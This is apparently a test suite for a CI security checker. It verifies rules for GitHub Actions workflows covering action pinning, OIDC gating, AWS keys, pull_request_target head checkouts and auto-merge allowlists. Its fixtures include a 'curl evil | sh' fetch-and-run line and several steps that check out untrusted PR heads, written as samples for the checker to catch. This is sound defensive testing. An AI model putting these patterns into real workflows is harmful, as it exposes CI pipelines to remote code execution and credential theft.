import assert from 'node:assert/strict';
import { readdirSync, readFileSync } from 'node:fs';
import { test } from 'node:test';
import {
	autoMergeProblem,
	checkWorkflow,
	grantsIdToken,
	isProductionGated,
	jobsOf,
	needsOf,
	prTargetHeadCheckouts,
	pushFullProblem,
	topLevelPermissions,
	triggersOn,
	unshaPushSteps
} from './check_workflows.mjs';

const SHA = 'de0fac2e4500dabe0009e67214ff5f5447ce83dd';

const good = `name: x
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA} # v6.0.2
      - uses: ./.github/actions/local
  deploy:
    needs: build
    environment: production
    permissions:
      id-token: write
    steps:
      - uses: aws-actions/configure-aws-credentials@${SHA} # v6.1.1
`;

const rules = (text, file = '.github/workflows/x.yml') => checkWorkflow(file, text).map((f) => f.rule);

test('a SHA-pinned, OIDC-in-production workflow passes (positive control)', () => {
	assert.deepEqual(checkWorkflow('.github/workflows/x.yml', good), []);
});

test('tags, branches and short SHAs are not pins', () => {
	for (const ref of ['actions/checkout@v6', 'actions/checkout@main', 'actions/checkout@de0fac2']) {
		assert.deepEqual(rules(good.replace(`actions/checkout@${SHA}`, ref)), ['pin'], ref);
	}
});

test('a SHA pin needs its version comment', () => {
	assert.deepEqual(rules(good.replace(' # v6.0.2', '')), ['pin']);
	assert.deepEqual(rules(good.replace(' # v6.0.2', ' # latest')), ['pin']);
});

test('reusable-workflow calls are held to the same pin rule; local ones are exempt', () => {
	const call = `permissions: {}\njobs:\n  a:\n    uses: someone/repo/.github/workflows/x.yml@v1\n  b:\n    uses: ./.github/workflows/gitleaks.yml\n`;
	assert.deepEqual(rules(call), ['pin']);
});

test('static AWS keys fail anywhere but a comment', () => {
	assert.deepEqual(rules(good + '        with:\n          aws-access-key-id: ${{ secrets.K }}\n'), ['no-keys']);
	assert.deepEqual(rules(good + '# never use AWS_SECRET_ACCESS_KEY\n'), []);
});

test('a Lambda log tail may not reach a public Actions log; a comment may name it', () => {
	const step = (run) => good + `      - run: |\n${run.map((l) => `          ${l}\n`).join('')}`;
	assert.deepEqual(rules(step(['aws lambda invoke --function-name f --log-type Tail out.json'])), ['no-tail']);
	assert.deepEqual(rules(step(['aws lambda invoke --function-name f --log-type=Tail out.json'])), ['no-tail']);
	assert.deepEqual(rules(step(["jq -r '.LogResult' meta.json | base64 -d"])), ['no-tail']);
	assert.deepEqual(rules(step(['# no --log-type Tail: this log is public', 'aws lambda invoke --function-name f out.json'])), []);
});

test('top-level permissions are required and may not grant id-token', () => {
	assert.deepEqual(rules(good.replace('permissions:\n  contents: read\n', '')), ['perms']);
	assert.deepEqual(rules(good.replace('  contents: read\n', '  contents: read\n  id-token: write\n')), ['perms']);
	assert.deepEqual(rules(good.replace('permissions:\n  contents: read\n', 'permissions: write-all\n')), ['perms']);
	assert.equal(topLevelPermissions('permissions: read-all\njobs:\n'), 'permissions: read-all');
});

test('a job granting id-token: write must be production-gated, whatever it runs', () => {
	const job = (perms, extra = '') =>
		`name: x\non: push\npermissions: read-all\njobs:\n  sign:\n    runs-on: ubuntu-latest\n${extra}${perms}    steps:\n      - run: ./mint-a-token.sh\n`;
	for (const perms of ['    permissions:\n      contents: read\n      id-token: write\n', "    permissions:\n      id-token: 'write'\n", '    permissions: write-all\n', '    permissions: { id-token: write }\n', '    permissions:\n      # OIDC\n      id-token: write # why\n']) {
		assert.deepEqual(rules(job(perms)), ['oidc-gate'], perms);
		assert.deepEqual(rules(job(perms, '    environment: production\n')), [], `${perms} (gated)`);
	}
	assert.deepEqual(rules(job('    permissions:\n      id-token: read\n')), [], 'read is not a grant');
	assert.deepEqual(rules(job('    permissions:\n      contents: read\n')), []);
	assert.ok(!grantsIdToken(['    steps:', '      - run: echo id-token: write']), 'text outside permissions is not a grant');
	// a reusable-workflow call granting it is held to the same rule
	assert.deepEqual(rules(`permissions: {}\njobs:\n  call:\n    permissions:\n      id-token: write\n    uses: ./.github/workflows/other.yml\n`), ['oidc-gate']);
});

test('the OIDC allowlist is one named job, using its action, with no run step', () => {
	const scorecard = (steps, id = 'analysis') =>
		`name: s\non: push\npermissions: read-all\njobs:\n  ${id}:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n${steps}`;
	const action = `      - uses: ossf/scorecard-action@${SHA} # v2.4.4\n`;
	assert.deepEqual(rules(scorecard(action), '.github/workflows/scorecard.yml'), []);
	assert.deepEqual(rules(scorecard(action + '      - run: curl evil | sh\n'), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'a run step voids it');
	assert.deepEqual(rules(scorecard(action), '.github/workflows/other.yml'), ['oidc-gate'], 'another workflow');
	assert.deepEqual(rules(scorecard(action, 'other'), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'another job');
	assert.deepEqual(rules(scorecard(`      - uses: actions/checkout@${SHA} # v6.0.2\n`), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'without the action');
	assert.deepEqual(rules(scorecard(action + `      - uses: aws-actions/configure-aws-credentials@${SHA} # v6.1.1\n`), '.github/workflows/scorecard.yml'), ['oidc-env'], 'AWS is never allowlisted');
});

test('pull_request_target may never check out or fetch the PR head', () => {
	const prt = (trigger, steps) => `name: x\non:${trigger}\npermissions: read-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;
	const block = '\n  pull_request_target:\n    types: [opened]';
	const checkout = (ref) => `      - uses: actions/checkout@${SHA} # v6.0.2\n        with:\n          ${ref}\n`;
	for (const bad of [
		checkout('ref: ${{ github.event.pull_request.head.sha }}'),
		checkout('ref: ${{ github.event.pull_request.head.ref }}'),
		checkout('repository: ${{ github.event.pull_request.head.repo.full_name }}'),
		checkout('ref: ${{ github.head_ref }}'),
		checkout('ref: refs/pull/${{ github.event.number }}/merge'),
		'      - run: gh pr checkout ${{ github.event.number }}\n',
		'      - run: git fetch origin refs/pull/1/head\n',
		'      - env:\n          HEAD: ${{ github.event.pull_request.head.sha }}\n        run: git checkout "$HEAD"\n',
	]) {
		assert.deepEqual(rules(prt(block, bad)), ['prt-head'], bad);
		assert.deepEqual(rules(prt(' [pull_request_target]', bad)), ['prt-head'], `inline list: ${bad}`);
		assert.deepEqual(rules(prt(' pull_request_target', bad)), ['prt-head'], `scalar: ${bad}`);
		assert.deepEqual(rules(prt('\n  - pull_request_target', bad)), ['prt-head'], `block list: ${bad}`);
		assert.deepEqual(rules(prt('\n  pull_request:', bad)), [], `plain pull_request is fine: ${bad}`);
	}
	// reading head metadata in an expression, a comment, or the base checkout is fine
	assert.deepEqual(rules(prt(block, `      - if: \${{ !contains(github.event.pull_request.head.ref, 'x/') }}\n        run: echo ok\n`)), []);
	assert.deepEqual(rules(prt(block, `      # never: ref: \${{ github.event.pull_request.head.sha }}\n` + checkout('persist-credentials: false'))), []);
	assert.ok(!triggersOn('on:\n  pull_request_target_x:\n', 'pull_request_target'));
	assert.ok(!triggersOn('on: push\njobs:\n  pull_request_target:\n', 'pull_request_target'), 'a job id is not a trigger');
	assert.deepEqual(prTargetHeadCheckouts(prt('\n  push:', checkout('ref: ${{ github.head_ref }}'))), []);
});

test('the repo workflows pass the guard (real positive control)', () => {
	const dir = new URL('../../.github/workflows/', import.meta.url);
	for (const f of readdirSync(dir).filter((n) => /\.ya?ml$/.test(n))) {
		assert.deepEqual(checkWorkflow(`.github/workflows/${f}`, readFileSync(new URL(f, dir), 'utf8')), [], f);
	}
});

test('assuming an AWS role outside environment: production fails', () => {
	assert.deepEqual(rules(good.replace('    environment: production\n', '')), ['oidc-env', 'oidc-gate']);
	assert.ok(isProductionGated(['    environment:', '      name: production', '      url: https://x']));
	assert.ok(!isProductionGated(['    environment: preview']));
});

test('jobsOf and needsOf read every needs shape', () => {
	const text = `jobs:\n  a:\n    runs-on: x\n  b:\n    needs: a\n  c:\n    needs: [a, b]\n  d:\n    needs:\n      - a\n      - c\n    runs-on: x\non: push\n`;
	const jobs = jobsOf(text);
	assert.deepEqual(jobs.map((j) => j.id), ['a', 'b', 'c', 'd']);
	assert.deepEqual(jobs.map((j) => needsOf(j.lines)), [[], ['a'], ['a', 'b'], ['a', 'c']]);
});

test('ci.yml: every job must fan into ci-gate', () => {
	const ci = `permissions:\n  contents: read\njobs:\n  test:\n    runs-on: x\n  lint:\n    runs-on: x\n  ci-gate:\n    needs: [test]\n`;
	const f = checkWorkflow('.github/workflows/ci.yml', ci);
	assert.deepEqual(f.map((x) => [x.rule, x.message.split(' ')[1]]), [['gate', 'lint']]);
	assert.deepEqual(checkWorkflow('.github/workflows/ci.yml', ci.replace('[test]', '[test, lint]')), []);
	assert.deepEqual(rules(ci.replace(/  ci-gate:[\s\S]*/, ''), '.github/workflows/ci.yml'), ['gate']);
});

// The docs-only skip may apply to pull requests only: a push to main always
// runs every heavy job, or a docs push after a red code push gets a green
// `CI gate` that the release preflight trusts.
const changesJob = (run, env = '          EVENT_NAME: ${{ github.event_name }}\n          BASE: ${{ github.event.pull_request.base.sha }}\n') =>
	`permissions:\n  contents: read\njobs:\n  changes:\n    runs-on: x\n    steps:\n      - id: diff\n        env:\n${env}        run: |\n${run}  test:\n    needs: changes\n    if: needs.changes.outputs.code == 'true'\n  ci-gate:\n    needs: [changes, test]\n`;
const FULL = '          if [ "$EVENT_NAME" != "pull_request" ]; then echo "code=true" >> "$GITHUB_OUTPUT"; exit 0; fi\n';
const DIFF = '          if git diff --name-only "$BASE" HEAD | grep -qvE \'^docs/\'; then\n            echo "code=true" >> "$GITHUB_OUTPUT"\n          else\n            echo "code=false" >> "$GITHUB_OUTPUT"\n          fi\n';

test('ci.yml: a push always runs the full suite (positive control)', () => {
	assert.deepEqual(checkWorkflow('.github/workflows/ci.yml', changesJob(FULL + DIFF)), []);
});

test('ci.yml: a changes job that can skip on a push fails push-full', () => {
	const ci = (text) => rules(text, '.github/workflows/ci.yml');
	// No event check at all: the diff decides on a push too.
	assert.deepEqual(ci(changesJob(DIFF)), ['push-full']);
	// The event check after the diff has already written code=.
	assert.deepEqual(ci(changesJob(DIFF + FULL)), ['push-full']);
	// Diffing a push against its before-SHA (the old shape).
	assert.deepEqual(ci(changesJob(FULL + DIFF, '          EVENT_NAME: ${{ github.event_name }}\n          BASE: ${{ github.event.pull_request.base.sha || github.event.before }}\n')), ['push-full']);
	// The check reads an env var nothing sets.
	assert.deepEqual(ci(changesJob(FULL + DIFF, '          BASE: ${{ github.event.pull_request.base.sha }}\n')), ['push-full']);
	// Only ci.yml is held to it.
	assert.deepEqual(rules(changesJob(DIFF)), []);
});

test('pushFullProblem accepts the real ci.yml shape', () => {
	const lines = ['        env:', '          EVENT_NAME: ${{ github.event_name }}', '        run: |', FULL.trimEnd()];
	assert.equal(pushFullProblem(lines), null);
});

test('a workflow with a production job may not restore a dependency cache', () => {
	const build = '  build:\n    runs-on: x\n    steps:\n      - uses: actions/setup-node@' + SHA + ' # v7.0.0\n        with:\n          node-version: 24\n          cache: pnpm\n';
	const withBuild = good.replace('jobs:\n', 'jobs:\n' + build);
	assert.deepEqual(rules(withBuild), ['no-cache']);
	assert.deepEqual(rules(good.replace('jobs:\n', 'jobs:\n  build2:\n    steps:\n      - uses: actions/cache@' + SHA + ' # v6.1.0\n')), ['no-cache']);
	// Commented out, or in a workflow that never deploys: fine.
	assert.deepEqual(rules(withBuild.replace('          cache: pnpm', '          # cache: pnpm')), []);
	assert.deepEqual(rules(withBuild.replace('    environment: production\n', '').replace(/  deploy:[\s\S]*/, '')), []);
	// Cache-Control headers in a run: script are not a cache restore.
	assert.deepEqual(rules(good + '      - run: aws s3 sync --cache-control "max-age=60" x y\n'), []);
});

test('a docker build must produce one linux/amd64 manifest without attestations', () => {
	const ok = '      - run: docker buildx build --provenance=false --sbom=false --platform linux/amd64 --load -t x .\n';
	assert.deepEqual(rules(good + ok), []);
	assert.deepEqual(rules(good + '      - run: docker build -t x .\n'), ['image']);
	assert.deepEqual(rules(good + ok.replace(' --sbom=false', '')), ['image']);
	assert.deepEqual(rules(good + '      # docker build -t x .\n'), []);
});

test('an image push must name the commit it was built from', () => {
	const push = (env) =>
		'      - name: Push\n        env:\n          VERSION: ${{ needs.preflight.outputs.version }}\n' +
		env +
		'        run: |\n          docker tag a "b:$TAG"\n          docker push "b:$TAG"\n      - name: Next\n        run: echo "${{ github.sha }}"\n';
	// Positive controls: the preflight's SHA, or github.sha, in the step.
	assert.deepEqual(rules(good + push('          COMMIT_SHA: ${{ needs.preflight.outputs.sha }}\n')), []);
	assert.deepEqual(rules(good + push('          COMMIT_SHA: ${{ github.sha }}\n')), []);
	// The version alone: a recut release would keep the old image.
	assert.deepEqual(rules(good + push('')), ['image-sha']);
	// A SHA in the NEXT step doesn't count, nor does a commented-out one.
	assert.deepEqual(unshaPushSteps((good + push('          # COMMIT_SHA: ${{ github.sha }}\n')).split('\n')).length, 1);
	// A commented push is not a push.
	assert.deepEqual(rules(good + '      # - run: docker push x\n'), []);
});

test('image-sha: the repo deploy workflows pass', () => {
	for (const f of ['deploy-backend.yml', 'deploy-frontend.yml']) {
		const file = new URL(`../../.github/workflows/${f}`, import.meta.url);
		assert.deepEqual(unshaPushSteps(readFileSync(file, 'utf8').split('\n')), [], f);
	}
	// And the backend deploy really pushes (so the check above checked something).
	assert.match(readFileSync(new URL('../../.github/workflows/deploy-backend.yml', import.meta.url), 'utf8'), /docker push "\$image"/);
});

const EXCLUDE_RENDERER_DEPS =
	"          !startsWith(steps.meta.outputs.directory, '/backend/renderer-deps') &&\n" +
	"          !contains(github.event.pull_request.head.ref, '/backend/renderer-deps/') &&\n";

test('auto-merge: the allowlist exists and leaves github_actions and docker to a human', () => {
	const file = '.github/workflows/dependabot-auto-merge.yml';
	const step = (list) =>
		good +
		`      - name: Approve + auto-merge minor / patch\n        if: >-\n          contains(fromJSON('${JSON.stringify(list)}'), steps.meta.outputs.package-ecosystem) &&\n${EXCLUDE_RENDERER_DEPS}          steps.meta.outputs.update-type == 'version-update:semver-patch'\n`;
	assert.deepEqual(rules(step(['npm_and_yarn', 'pip', 'docker_compose', 'terraform']), file), []);
	assert.deepEqual(rules(step(['npm_and_yarn', 'docker']), file), ['auto-merge']);
	assert.deepEqual(rules(step(['github_actions']), file), ['auto-merge']);
	assert.deepEqual(rules(good, file), ['auto-merge'], 'no allowlist at all fails closed');
	assert.deepEqual(rules(step(['docker'])), [], 'other workflows are not read for it');
	assert.match(checkWorkflow(file, step(['docker']))[0].message, /includes docker/);
});

test('auto-merge: the renderer image\'s npm directory stays manual, by directory and by branch', () => {
	const file = '.github/workflows/dependabot-auto-merge.yml';
	const allow = `contains(fromJSON('["npm_and_yarn", "pip"]'), steps.meta.outputs.package-ecosystem) &&`;
	const patch = "steps.meta.outputs.update-type == 'version-update:semver-patch'";
	const step = (...conds) => good + `      - name: Approve + auto-merge\n        if: >-\n${conds.map((c) => `          ${c}\n`).join('')}        env:\n          X: y\n`;
	const byDir = "!startsWith(steps.meta.outputs.directory, '/backend/renderer-deps') &&";
	const byBranch = "!contains(github.event.pull_request.head.ref, '/backend/renderer-deps/') &&";

	assert.deepEqual(rules(step(allow, byDir, byBranch, patch), file), [], 'positive control: both exclusions present');
	assert.deepEqual(rules(step(byBranch, allow, byDir, patch), file), [], 'order within the condition does not matter');
	assert.deepEqual(rules(step(allow, patch), file), ['auto-merge'], 'neither exclusion');
	assert.deepEqual(rules(step(allow, byDir, patch), file), ['auto-merge'], 'directory only: the branch backstop is missing');
	assert.deepEqual(rules(step(allow, byBranch, patch), file), ['auto-merge'], 'branch only: the directory check is missing');
	assert.match(checkWorkflow(file, step(allow, byDir, patch))[0].message, /head\.ref, '\/backend\/renderer-deps\/'/);
	// Near misses that would not exclude it.
	assert.deepEqual(rules(step(allow, byDir.slice(1), byBranch, patch), file), ['auto-merge'], 'not negated');
	assert.deepEqual(rules(step(allow, byDir.replace(' &&', ' ||'), byBranch, patch), file), ['auto-merge'], 'joined with ||');
	assert.deepEqual(rules(step(allow, byDir.replace('renderer-deps', 'renderer'), byBranch, patch), file), ['auto-merge'], 'another directory');
	// Outside the allowlist's own `if:` it does not count.
	const elsewhere = good +
		`      - name: Other\n        if: >-\n          ${byDir}\n          ${byBranch}\n          true\n` +
		`      - name: Approve + auto-merge\n        if: >-\n          ${allow}\n          ${patch}\n`;
	assert.deepEqual(rules(elsewhere, file), ['auto-merge'], 'the exclusions sit in another step');
	const inRun = step(allow, patch) + `        run: |\n          ${byDir}\n          ${byBranch}\n`;
	assert.deepEqual(rules(inRun, file), ['auto-merge'], 'the same text past the end of the `if:` does not count');
});

test('auto-merge: the repo workflow passes', () => {
	const file = new URL('../../.github/workflows/dependabot-auto-merge.yml', import.meta.url);
	assert.equal(autoMergeProblem(readFileSync(file, 'utf8')), null);
});
